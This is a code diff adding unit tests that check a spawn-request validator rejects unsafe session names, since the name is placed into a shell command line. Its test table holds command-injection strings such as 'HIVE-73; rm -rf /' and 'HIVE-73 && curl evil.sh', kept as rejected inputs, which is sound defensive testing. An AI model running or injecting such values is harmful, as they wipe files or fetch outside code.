@@ -38,6 +38,62 @@ describe('parseSpawnRequest', () => {
     ]);
   });
 
+  describe('name (HIVE-77)', () => {
+    it('accepts an issue key and its de-duplicating suffix', () => {
+      // The only two shapes the store constructs: `HIVE-73`, then `HIVE-73-2`
+      // when a second session is opened for the same ticket.
+      expect(parseSpawnRequest({ ...validSpawn, name: 'HIVE-73' })).toEqual({
+        ...validSpawn,
+        name: 'HIVE-73',
+      });
+      expect(parseSpawnRequest({ ...validSpawn, name: 'HIVE-73-2' })).toEqual({
+        ...validSpawn,
+        name: 'HIVE-73-2',
+      });
+    });
+
+    it('omits the key entirely when it was not sent', () => {
+      // Absent means main names the session after its entity id, which is
+      // every spawn that did not come from a ticket card.
+      expect(parseSpawnRequest({ ...validSpawn })).not.toHaveProperty('name');
+    });
+
+    it.each([
+      ['a space', 'HIVE 73'],
+      ['a quote', "HIVE-'73"],
+      ['a backtick', 'HIVE-`73`'],
+      ['a dollar', 'HIVE-$73'],
+      ['a semicolon', 'HIVE-73; rm -rf /'],
+      ['a pipe', 'HIVE-73 | sh'],
+      ['an ampersand', 'HIVE-73 && curl evil.sh'],
+      ['a newline', 'HIVE-73\nrm -rf /'],
+      ['a leading hyphen, which would read as a flag', '--help'],
+      ['an empty string', ''],
+      ['a non-string', 42],
+    ])('rejects %s', (_label, name) => {
+      /**
+       * Unlike `model` and `effort` this has no closed list behind it, so the
+       * pattern *is* the defence — the value is interpolated into a command
+       * line a login shell parses.
+       *
+       * Rejected here rather than dropped, which is what `bootstrap.ts` does
+       * with the same value. Not a contradiction: main's own spawn path reaches
+       * `bootstrap.ts` with no guard in between and needs a lenient fallback,
+       * whereas a *renderer* sending an unsendable name built it wrongly and
+       * should hear about it.
+       */
+      expect(() => parseSpawnRequest({ ...validSpawn, name })).toThrow(
+        IpcValidationError,
+      );
+    });
+
+    it('rejects a name past the sendable maximum', () => {
+      expect(() =>
+        parseSpawnRequest({ ...validSpawn, name: `A${'b'.repeat(64)}` }),
+      ).toThrow(IpcValidationError);
+    });
+  });
+
   describe('model and effort (story 109)', () => {
     it('accepts a member of each closed set', () => {
       expect(
